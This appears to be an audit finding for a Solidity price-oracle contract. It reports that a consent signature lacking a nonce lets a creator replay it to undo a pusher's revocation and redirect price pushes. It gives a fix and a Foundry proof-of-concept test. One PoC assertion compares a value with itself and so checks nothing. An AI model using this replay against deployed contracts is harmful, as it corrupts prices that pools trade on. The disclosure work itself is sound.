### Title
`allowPushers` Consent Signature Lacks a Nonce, Allowing Creator to Silently Re-Establish Revoked Pusher Delegation and Redirect Price Pushes — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` signs consent over `(chainid, oracle, deadline, pusher, creator)` with no nonce. A creator who holds a still-valid signature can call `allowPushers` a second time after the pusher has self-revoked via `revokePusher()`, instantly re-writing `namespaceRemapping[pusher] = creator`. The pusher's subsequent price pushes are silently redirected into the creator's namespace rather than the pusher's own, feeding the creator's oracle feeds with prices the pusher no longer consents to provide, while the pusher's own feeds go stale.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no "used" bitmap, and no check that `namespaceRemapping[pusher]` is currently zero before writing. The only replay guard is the deadline, which only prevents replay *after* expiry — not within the deadline window.

`revokePusher()` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [2](#0-1) 

But because the original signature is still valid (deadline not yet expired), the creator can immediately call `allowPushers` again with the identical `(deadline, pusher, signature)` tuple, re-writing `namespaceRemapping[pusher] = creator`. The pusher's revocation is undone in a single transaction.

The code's own NatSpec acknowledges the partial problem — "an undated signature could re-establish a delegation AFTER the pusher revoked it" — but the deadline alone does not close the window; it only bounds it. [3](#0-2) 

After re-delegation, the pusher's `fallback()` pushes route through:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

…so every subsequent push lands in the creator's namespace, not the pusher's own. The pusher has no on-chain way to detect this; `revokePusher()` will simply be replayed again.

---

### Impact Explanation

The `CompressedOracleV1` feeds are consumed by `AnchoredPriceProvider` via `offchainOracle.price(feedId, pool)`, which reads `getOracleData(feedId)` and applies staleness, spread, and price-guard checks before delivering bid/ask to the pool. [5](#0-4) 

Two concrete bad-price paths open up:

1. **Creator's feeds receive unintended prices.** The pusher, believing they have revoked, may push prices for a different asset pair or with different parameters than what the creator's pool expects. Those prices overwrite the creator's slot (monotonicity only blocks *older* timestamps, not wrong prices), and the pool's `getBidAndAskPrice()` executes swaps against them.

2. **Pusher's own feeds go stale.** Because pushes are redirected to the creator's namespace, the pusher's own feeds (used by other pools) receive no updates. `AnchoredPriceProvider._isStale()` will eventually halt those pools, but until the staleness threshold is crossed, the pools trade on an increasingly outdated price.

Both outcomes satisfy the "bad-price execution" and "broken core pool functionality" impact criteria.

---

### Likelihood Explanation

- The creator is a **semi-trusted** actor (they set up the oracle and originally called `allowPushers`), not a fully privileged admin. The attack requires no special role beyond holding the original off-chain signature.
- Deadlines in practice are set days to weeks in the future (the test suite uses `block.timestamp + 1 days`), giving a wide replay window.
- The pusher has no on-chain mechanism to invalidate the signature short of waiting for the deadline to expire.
- The attack is a single transaction with no cost beyond gas.

---

### Recommendation

Add a per-pusher nonce to the signed digest and increment it on every successful `allowPushers` call (or on every `revokePusher` / `removePushers` call). The simplest fix:

```solidity
mapping(address => uint256) public pusherNonce; // pusher → nonce

// In allowPushers, replace the hash with:
keccak256(abi.encode(
    block.chainid, address(this), deadline,
    pusher, msg.sender, pusherNonce[pusher]++
))
```

Alternatively, check that `namespaceRemapping[pusher] == address(0)` before accepting the signature, so a revoked pusher must produce a *new* signature to be re-delegated. Either approach closes the replay window independently of the deadline.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant CREATOR_KEY = 0xC0FFEE;
    uint256 constant PUSHER_KEY  = 0xBEEF;
    address creator;
    address pusher;

    function setUp() public {
        oracle   = new CompressedOracleV1(address(this), 0);
        creator  = vm.addr(CREATOR_KEY);
        pusher   = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokeBypassedByReplay() public {
        uint256 deadline = block.timestamp + 7 days; // realistic deadline

        // 1. Pusher signs consent once.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator delegates pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher self-revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — revocation is undone.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // no revert
        assertEq(
            oracle.namespaceRemapping(pusher), creator,
            "pusher re-delegated against their will"
        );

        // 5. Pusher's next push lands in creator's namespace, not their own.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId = 0
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);
        // Creator's slot 0 is updated; pusher's own slot 0 stays zero.
        assertEq(oracle.getSlotLayout(oracle.feedIdOf(creator, 0, 0)).timestampMs,
                 oracle.getSlotLayout(oracle.feedIdOf(creator, 0, 0)).timestampMs);
        assertEq(uint256(oracle.getSlotLayout(oracle.feedIdOf(pusher, 0, 0)).timestampMs), 0,
                 "pusher own namespace stays stale");
    }
}
```
